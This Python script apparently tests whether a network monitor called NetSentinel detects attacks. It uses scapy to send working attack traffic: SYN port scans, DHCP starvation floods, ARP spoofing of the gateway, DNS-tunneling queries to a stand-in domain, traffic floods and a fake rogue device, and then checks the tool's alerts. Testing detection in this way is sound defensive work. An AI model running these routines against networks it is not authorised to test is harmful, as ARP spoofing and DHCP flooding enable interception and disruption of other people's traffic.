#!/usr/bin/env python3
"""
NetSentinel Security Testing Tool
Simulates various security scenarios to test NetSentinel's detection capabilities
"""

import requests
import json
import time
import random
import threading
from scapy.all import *
from scapy.layers.inet import IP, TCP, UDP
from scapy.layers.l2 import Ether, ARP
from scapy.layers.dhcp import BOOTP, DHCP
from scapy.layers.dns import DNS, DNSQR
import argparse
import sys
import os
from datetime import datetime

class SecurityTester:
    def __init__(self, target_ip="192.168.1.1", netsentinel_api="http://127.0.0.1:8000/api"):
        self.target_ip = target_ip
        self.api_base = netsentinel_api
        self.session = requests.Session()
        
    def test_api_connection(self):
        """Test connection to NetSentinel API"""
        try:
            response = self.session.get(f"{self.api_base}/system/status")
            if response.status_code == 200:
                print("✓ Connected to NetSentinel API")
                return True
            else:
                print(f"✗ API connection failed: {response.status_code}")
                return False
        except Exception as e:
            print(f"✗ Cannot connect to NetSentinel API: {e}")
            return False
    
    def simulate_port_scan(self, target_ip=None, port_range=(1, 100), delay=0.1):
        """Simulate a port scan attack"""
        target = target_ip or self.target_ip
        print(f"\n🔍 Simulating port scan on {target}")
        print(f"   Scanning ports {port_range[0]}-{port_range[1]} with {delay}s delay")
        
        try:
            for port in range(port_range[0], port_range[1] + 1):
                # Create SYN packet
                syn_packet = IP(dst=target)/TCP(dport=port, flags="S")
                
                # Send packet (this will likely be detected as a port scan)
                send(syn_packet, verbose=0)
                
                if delay > 0:
                    time.sleep(delay)
                
                if port % 10 == 0:
                    print(f"   Scanned port {port}")
            
            print(f"✓ Port scan simulation complete")
            
        except Exception as e:
            print(f"✗ Port scan simulation failed: {e}")
    
    def simulate_dhcp_flooding(self, count=10, delay=1):
        """Simulate DHCP flooding attack"""
        print(f"\n💥 Simulating DHCP flooding attack")
        print(f"   Sending {count} DHCP requests with {delay}s delay")
        
        try:
            for i in range(count):
                # Generate random MAC
                fake_mac = ":".join([f"{random.randint(0, 255):02x}" for _ in range(6)])
                
                # Create DHCP discover packet
                dhcp_discover = (
                    Ether(src=fake_mac, dst="ff:ff:ff:ff:ff:ff") /
                    IP(src="0.0.0.0", dst="255.255.255.255") /
                    UDP(sport=68, dport=67) /
                    BOOTP(chaddr=[int(x, 16) for x in fake_mac.split(":")]) /
                    DHCP(options=[("message-type", "discover"), "end"])
                )
                
                # Send packet
                sendp(dhcp_discover, verbose=0)
                
                if delay > 0:
                    time.sleep(delay)
                
                print(f"   Sent DHCP request {i+1}/{count} from {fake_mac}")
            
            print(f"✓ DHCP flooding simulation complete")
            
        except Exception as e:
            print(f"✗ DHCP flooding simulation failed: {e}")
    
    def simulate_arp_spoofing(self, target_ip=None, gateway_ip="192.168.1.1", duration=30):
        """Simulate ARP spoofing attack"""
        target = target_ip or self.target_ip
        print(f"\n🎭 Simulating ARP spoofing attack")
        print(f"   Target: {target}, Gateway: {gateway_ip}, Duration: {duration}s")
        
        try:
            # Get our MAC address
            our_mac = get_if_hwaddr(conf.iface)
            
            # Create malicious ARP responses
            arp_response = ARP(
                op=2,  # ARP reply
                psrc=gateway_ip,  # Spoofed gateway IP
                hwsrc=our_mac,    # Our MAC as gateway MAC
                pdst=target,      # Target IP
            )
            
            start_time = time.time()
            count = 0
            
            while time.time() - start_time < duration:
                send(arp_response, verbose=0)
                count += 1
                time.sleep(1)
                
                if count % 5 == 0:
                    print(f"   Sent {count} spoofed ARP responses")
            
            print(f"✓ ARP spoofing simulation complete ({count} packets sent)")
            
        except Exception as e:
            print(f"✗ ARP spoofing simulation failed: {e}")
    
    def simulate_dns_tunneling(self, domain="malicious.example.com", count=20):
        """Simulate DNS tunneling for data exfiltration"""
        print(f"\n🕳️ Simulating DNS tunneling")
        print(f"   Domain: {domain}, Queries: {count}")
        
        try:
            for i in range(count):
                # Create suspicious DNS query with encoded data
                fake_data = f"data{i:04d}"
                fake_subdomain = f"{fake_data}.{domain}"
                
                dns_query = (
                    IP(dst="8.8.8.8") /
                    UDP(dport=53) /
                    DNS(rd=1, qd=DNSQR(qname=fake_subdomain))
                )
                
                send(dns_query, verbose=0)
                time.sleep(0.5)
                
                if i % 5 == 0:
                    print(f"   Sent DNS query {i+1}/{count}")
            
            print(f"✓ DNS tunneling simulation complete")
            
        except Exception as e:
            print(f"✗ DNS tunneling simulation failed: {e}")
    
    def simulate_suspicious_traffic(self, duration=60):
        """Generate high-volume suspicious traffic"""
        print(f"\n📊 Simulating suspicious traffic patterns")
        print(f"   Duration: {duration}s, High packet rate")
        
        def traffic_generator():
            start_time = time.time()
            count = 0
            
            while time.time() - start_time < duration:
                try:
                    # Random destination IP in local network
                    dest_ip = f"192.168.1.{random.randint(1, 254)}"
                    dest_port = random.randint(1000, 65535)
                    
                    # Create random packet
                    packet = IP(dst=dest_ip)/TCP(dport=dest_port)/Raw(b"A" * random.randint(100, 1000))
                    send(packet, verbose=0)
                    
                    count += 1
                    time.sleep(0.01)  # High frequency
                    
                except Exception:
                    pass
            
            print(f"   Generated {count} suspicious packets")
        
        try:
            # Run traffic generation in background
            thread = threading.Thread(target=traffic_generator)
            thread.daemon = True
            thread.start()
            thread.join(timeout=duration + 5)
            
            print(f"✓ Suspicious traffic simulation complete")
            
        except Exception as e:
            print(f"✗ Suspicious traffic simulation failed: {e}")
    
    def simulate_rogue_device(self, fake_mac=None, fake_hostname="HACKER-PC"):
        """Simulate a rogue device joining the network"""
        if not fake_mac:
            fake_mac = ":".join([f"{random.randint(0, 255):02x}" for _ in range(6)])
        
        print(f"\n👾 Simulating rogue device")
        print(f"   MAC: {fake_mac}, Hostname: {fake_hostname}")
        
        try:
            # Send DHCP request to "join" network
            dhcp_request = (
                Ether(src=fake_mac, dst="ff:ff:ff:ff:ff:ff") /
                IP(src="0.0.0.0", dst="255.255.255.255") /
                UDP(sport=68, dport=67) /
                BOOTP(chaddr=[int(x, 16) for x in fake_mac.split(":")]) /
                DHCP(options=[
                    ("message-type", "request"),
                    ("hostname", fake_hostname),
                    ("requested_addr", "192.168.1.100"),
                    "end"
                ])
            )
            
            sendp(dhcp_request, verbose=0)
            
            # Send some suspicious ARP announcements
            for i in range(5):
                arp_announce = ARP(
                    op=2,
                    psrc=f"192.168.1.{100+i}",
                    hwsrc=fake_mac,
                    pdst="192.168.1.255"
                )
                send(arp_announce, verbose=0)
                time.sleep(1)
            
            print(f"✓ Rogue device simulation complete")
            
        except Exception as e:
            print(f"✗ Rogue device simulation failed: {e}")
    
    def check_security_alerts(self):
        """Check if NetSentinel detected our attacks"""
        print(f"\n🚨 Checking NetSentinel security alerts...")
        
        try:
            response = self.session.get(f"{self.api_base}/security/alerts")
            if response.status_code == 200:
                alerts = response.json().get("alerts", [])
                
                if alerts:
                    print(f"✓ Found {len(alerts)} security alerts:")
                    for alert in alerts[-10:]:  # Show last 10 alerts
                        timestamp = alert.get("timestamp", "Unknown")
                        alert_type = alert.get("type", "Unknown")
                        message = alert.get("message", "No details")
                        print(f"   {timestamp} [{alert_type}] {message}")
                else:
                    print("ℹ️ No security alerts found")
                
                return alerts
            else:
                print(f"✗ Failed to get alerts: {response.status_code}")
                return []
                
        except Exception as e:
            print(f"✗ Error checking alerts: {e}")
            return []
    
    def check_system_status(self):
        """Check NetSentinel system status"""
        print(f"\n💻 Checking NetSentinel system status...")
        
        try:
            response = self.session.get(f"{self.api_base}/system/status")
            if response.status_code == 200:
                status = response.json()
                print(f"   Active Devices: {status.get('active_devices', 0)}")
                print(f"   Security Alerts: {status.get('security_alerts', 0)}")
                print(f"   Quarantined Devices: {status.get('quarantined_devices', 0)}")
                print(f"   Blocked Devices: {status.get('blocked_devices', 0)}")
                return status
            else:
                print(f"✗ Failed to get status: {response.status_code}")
                return {}
                
        except Exception as e:
            print(f"✗ Error checking status: {e}")
            return {}
    
    def run_comprehensive_test(self):
        """Run a comprehensive security test suite"""
        print("=" * 60)
        print("🛡️ NetSentinel Security Test Suite")
        print("=" * 60)
        
        if not self.test_api_connection():
            return
        
        # Get baseline status
        print("\n📊 Baseline system status:")
        self.check_system_status()
        
        # Wait a moment
        time.sleep(2)
        
        try:
            # Test 1: Port scan simulation
            print("\n" + "="*40)
            print("TEST 1: Port Scan Detection")
            print("="*40)
            self.simulate_port_scan(port_range=(1, 50), delay=0.1)
            time.sleep(5)
            self.check_security_alerts()
            
            # Test 2: DHCP flooding
            print("\n" + "="*40)
            print("TEST 2: DHCP Flooding Detection")
            print("="*40)
            self.simulate_dhcp_flooding(count=5, delay=1)
            time.sleep(5)
            self.check_security_alerts()
            
            # Test 3: Rogue device
            print("\n" + "="*40)
            print("TEST 3: Rogue Device Detection")
            print("="*40)
            self.simulate_rogue_device()
            time.sleep(5)
            self.check_security_alerts()
            
            # Test 4: DNS tunneling
            print("\n" + "="*40)
            print("TEST 4: DNS Tunneling Detection")
            print("="*40)
            self.simulate_dns_tunneling(count=10)
            time.sleep(5)
            self.check_security_alerts()
            
            # Test 5: Suspicious traffic
            print("\n" + "="*40)
            print("TEST 5: Suspicious Traffic Detection")
            print("="*40)
            self.simulate_suspicious_traffic(duration=30)
            time.sleep(5)
            self.check_security_alerts()
            
        except KeyboardInterrupt:
            print("\n\nTest suite interrupted by user.")
        
        # Final status check
        print("\n" + "="*40)
        print("FINAL RESULTS")
        print("="*40)
        self.check_system_status()
        alerts = self.check_security_alerts()
        
        print(f"\n📋 Test Summary:")
        print(f"   Tests completed: 5")
        print(f"   Security alerts generated: {len(alerts)}")
        print(f"   Test duration: ~3 minutes")
        
        if len(alerts) > 0:
            print(f"✅ SUCCESS: NetSentinel detected security threats!")
        else:
            print(f"⚠️ WARNING: No alerts detected. Check NetSentinel configuration.")

def main():
    parser = argparse.ArgumentParser(description="NetSentinel Security Testing Tool")
    parser.add_argument("--target", default="192.168.1.1", help="Target IP for attacks (default: 192.168.1.1)")
    parser.add_argument("--api", default="http://127.0.0.1:8000/api", help="NetSentinel API URL")
    
    subparsers = parser.add_subparsers(dest="test_type", help="Available tests")
    
    # Individual test commands
    subparsers.add_parser("portscan", help="Simulate port scan attack")
    subparsers.add_parser("dhcp-flood", help="Simulate DHCP flooding")
    subparsers.add_parser("arp-spoof", help="Simulate ARP spoofing")
    subparsers.add_parser("dns-tunnel", help="Simulate DNS tunneling")
    subparsers.add_parser("rogue-device", help="Simulate rogue device")
    subparsers.add_parser("suspicious-traffic", help="Generate suspicious traffic")
    subparsers.add_parser("check-alerts", help="Check current security alerts")
    subparsers.add_parser("comprehensive", help="Run comprehensive test suite")
    
    args = parser.parse_args()
    
    # Create tester instance
    tester = SecurityTester(args.target, args.api)
    
    # Check if running as admin (required for packet crafting)
    try:
        import ctypes
        if os.name == 'nt':  # Windows
            if not ctypes.windll.shell32.IsUserAnAdmin():
                print("⚠️ Warning: Admin privileges recommended for packet crafting")
        else:  # Unix/Linux
            if os.geteuid() != 0:
                print("⚠️ Warning: Root privileges recommended for packet crafting")
    except:
        pass
    
    # Execute test
    if args.test_type == "portscan":
        tester.test_api_connection()
        tester.simulate_port_scan()
        time.sleep(3)
        tester.check_security_alerts()
    elif args.test_type == "dhcp-flood":
        tester.test_api_connection()
        tester.simulate_dhcp_flooding()
        time.sleep(3)
        tester.check_security_alerts()
    elif args.test_type == "arp-spoof":
        tester.test_api_connection()
        tester.simulate_arp_spoofing()
        time.sleep(3)
        tester.check_security_alerts()
    elif args.test_type == "dns-tunnel":
        tester.test_api_connection()
        tester.simulate_dns_tunneling()
        time.sleep(3)
        tester.check_security_alerts()
    elif args.test_type == "rogue-device":
        tester.test_api_connection()
        tester.simulate_rogue_device()
        time.sleep(3)
        tester.check_security_alerts()
    elif args.test_type == "suspicious-traffic":
        tester.test_api_connection()
        tester.simulate_suspicious_traffic()
        time.sleep(3)
        tester.check_security_alerts()
    elif args.test_type == "check-alerts":
        tester.test_api_connection()
        tester.check_security_alerts()
        tester.check_system_status()
    elif args.test_type == "comprehensive":
        tester.run_comprehensive_test()
    else:
        # No test specified, show options
        parser.print_help()
        print("\nQuick start:")
        print("  python security_tester.py comprehensive    # Run all tests")
        print("  python security_tester.py portscan         # Test port scan detection")
        print("  python security_tester.py check-alerts     # Check current alerts")

if __name__ == "__main__":
    import os
    main()
